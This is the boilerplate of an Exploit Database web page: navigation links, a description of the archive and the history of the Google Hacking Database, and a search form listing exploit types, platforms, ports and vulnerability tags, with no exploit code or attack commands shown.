| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/statistics) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Databases
[Exploits](/)
[Google Hacking](/google-hacking-database)
[Papers](/papers)
[Shellcodes](/shellcodes)

Links
[Search Exploit-DB](/search)
[Submit Entry](/submit)
[SearchSploit Manual](/searchsploit)
[Exploit Statistics](/statistics)

Sites
[OffSec](https://www.offsec.com)
[Kali Linux](https://www.kali.org/)
[VulnHub](https://www.vulnhub.com)

Solutions
[Courses and Certifications](https://www.offsec.com/courses-and-certifications/)
[Learn Subscriptions](https://www.offsec.com/learn/)
[OffSec Cyber Range](https://www.offsec.com/cyber-range/)
[Proving Grounds](https://www.offsec.com/labs/)
[Penetration Testing Services](https://www.offsec.com/penetration-testing/)

* [Exploit Database by OffSec](/)
* [Terms](/terms)
* [Privacy](/privacy)
* [About Us](/about-exploit-db)
* [FAQ](/faq)
* [Cookies](/cookies)

©
[OffSec Services Limited](https://www.offsec.com/) 2025. All rights reserved.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

Close

##### OffSec Resources

×

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
|  | [Proving Grounds](https://www.offsec.com/labs/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/serchsploit) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Close

##### Search The Exploit Database

×

Title

CVE

Type

dos

local

remote

shellcode

papers

webapps

Platform

AIX

ASP

BSD

BSD\_PPC

BSD\_x86

BSDi\_x86

CGI

FreeBSD

FreeBSD\_x86

FreeBSD\_x86-64

Generator

Hardware

HP-UX

IRIX

JSP

Linux

Linux\_MIPS

Linux\_PPC

Linux\_SPARC

Linux\_x86

Linux\_x86-64

MINIX

Multiple

NetBSD\_x86

Novell

OpenBSD

OpenBSD\_x86

OSX\_PPC

OSX

PHP

Plan9

QNX

SCO

SCO\_x86

Solaris

Solaris\_SPARC

Solaris\_x86

Tru64

ULTRIX

Unix

UnixWare

Windows\_x86

Windows\_x86-64

Windows

ARM

CFM

Netware

SuperH\_SH4

Java

BeOS

Immunix

Palm\_OS

AtheOS

iOS

Android

XML

Perl

Python

System\_z

JSON

ASHX

Ruby

ASPX

macOS

Linux\_CRISv32

eZine

Magazine

NodeJS

Alpha

Solaris\_MIPS

Lua

watchOS

VxWorks

Python2

Python3

TypeScript

Go

Author

Content

Port

14

21

22

23

25

42

49

53

66

69

70

79

80

81

102

105

110

111

113

119

123

135

139

143

161

162

164

383

389

402

406

411

443

444

445

446

502

504

513

514

515

532

548

554

555

617

623

631

655

689

783

787

808

873

888

901

998

1000

1040

1089

1099

1100

1114

1120

1194

1235

1471

1521

1533

1581

1589

1604

1617

1723

1743

1761

1812

1858

1861

1900

1947

2000

2022

2049

2100

2103

2121

2125

2181

2242

2315

2375

2380

2381

2401

2480

2525

2640

2810

2812

2947

2954

2990

3000

3030

3050

3052

3128

3129

3181

3200

3217

3306

3333

3378

3389

3460

3465

3500

3535

3632

3690

3790

3814

3817

4000

4002

4070

4081

4105

4111

4322

4343

4434

4444

4501

4555

4592

4661

4750

4848

5000

5060

5061

5080

5081

5093

5151

5180

5247

5250

5272

5308

5432

5466

5554

5555

5600

5655

5666

5800

5803

5814

5858

5900

5984

6066

6070

6080

6082

6101

6112

6129

6379

6502

6503

6660

6667

7001

7002

7070

7071

7080

7100

7144

7210

7272

7290

7426

7443

7510

7547

7649

7770

7777

7778

7787

7879

7902

8000

8001

8002

8004

8008

8020

8022

8023

8028

8030

8080

8081

8082

8088

8090

8181

8300

8400

8443

8445

8473

8500

8585

8619

8800

8812

8839

8880

8888

9000

9001

9002

9080

9090

9091

9100

9124

9200

9251

9256

9443

9447

9784

9788

9855

9876

9900

9987

9993

9999

10000

10001

10080

10202

10203

10443

10616

11000

11211

11460

12203

12221

12345

12397

12401

13327

13701

13722

13838

16992

18821

18881

19000

19810

19813

20000

20002

20010

20031

20111

20171

22003

23423

25672

26000

27015

27700

28015

30000

30303

31337

32400

32674

32764

34205

37215

37777

37848

38292

40007

41523

44334

46824

48080

49152

50000

50496

52311

52789

52869

52986

53413

54345

54890

55554

55555

56380

57772

58080

62514

Tag

WordPress Core

Metasploit Framework (MSF)

WordPress Plugin

SQL Injection (SQLi)

Cross-Site Scripting (XSS)

File Inclusion (LFI/RFI)

Cross-Site Request Forgery (CSRF)

Denial of Service (DoS)

Code Injection

Command Injection

Authentication Bypass / Credentials Bypass (AB/CB)

Client Side

Use After Free (UAF)

Out Of Bounds

Remote

Local

XML External Entity (XXE)

Integer Overflow

Server-Side Request Forgery (SSRF)

Race Condition

NULL Pointer Dereference

Malware

Buffer Overflow

Heap Overflow

Type Confusion

Object Injection

Bug Report

Console

Pwn2Own

Traversal

Deserialization

Verified

Has App

No Metasploit

Search


